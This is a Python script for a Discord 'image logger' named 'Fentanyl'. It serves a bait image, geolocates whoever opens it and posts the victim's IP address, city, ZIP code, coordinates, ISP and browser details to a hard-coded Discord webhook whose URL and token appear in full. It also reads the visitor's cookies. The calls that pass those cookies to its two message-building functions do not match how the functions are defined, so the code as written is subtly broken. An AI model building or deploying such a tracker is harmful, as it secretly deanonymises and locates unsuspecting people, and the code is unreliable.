from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, httpagentparser

webhook = 'https://discord.com/api/webhooks/1067207085785350195/xE3sGLwfaMU4DDvsBolY71qCsJram_sJjErF3cWaW21wC9Op-W1kNxAM_Grc8VuPMRma'
bindata = requests.get('https://content-cdn.tips-and-tricks.co/wp-content/uploads/2021/12/01091312/1-768x512.jpeg').content

buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Fentanyl",
  "content": "@everyone",
  "embeds": [
    {
      "title": "Fentanyl strikes again!",
      "color": 16711803,
      "description": "A Victim opened the original Image. You can find their info below.",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
        {
          "name": "IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
          "name": "Advanced Info",
          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
          "inline": False
        }
      ]
    }
  ],
}

def prev(ip,uag):
  return {
  "username": "Fentanyl",
  "content": "",
  "embeds": [
    {
      "title": "Fentanyl Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
      ]
    }
  ],
}


# This long bit of Base85 encoded Binary is an image with no actual content, which creates a loading image on discord.
# It's not malware, if you don't trust it read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious
# I've already disproved every single one. You aren't helping.
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        cookies = self.headers.get("Cookie")
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        ip = self.client_address[0]
        uag = self.headers.get("User-Agent")
        useragent = httpagentparser.detect(uag)
        os = useragent['os']['name']
        browser = useragent['browser']['name']
        if 'ip' in dic:
            try:
                city = requests.get(f'https://ipapi.co/{ip}/city/').text
                reg = requests.get(f'https://ipapi.co/{ip}/region/').text
                country = requests.get(f'https://ipapi.co/{ip}/country_name/').text
                loc = requests.get(f'https://ipapi.co/{ip}/latlong/').text
                org = requests.get(f'https://ipapi.co/{ip}/org/').text
                postal = requests.get(f'https://ipapi.co/{ip}/postal/').text
            except:
                pass
            if 'img' in dic:
                requests.post(webhook, json=formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser,cookies))
                if buggedimg:
                    self.send_response(200)
                    self.send_header('Content-type','image/jpeg')
                    self.end_headers()
                    self.wfile.write(buggedbin)
                else:
                    self.send_response(200)
                    self.send_header('Content-type','image/jpeg')
                    self.end_headers()
                    self.wfile.write(bindata)
            else:
                requests.post(webhook, json=prev(ip,uag,cookies))
                self.send_response(200)
                self.send_header('Content-type','text/html')
                self.end_headers()
                self.wfile.write(b'<html><body><h1>404</h1></body></html>')
        else:
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            self.wfile.write(b'<html><body><h1>404</h1></body></html>')
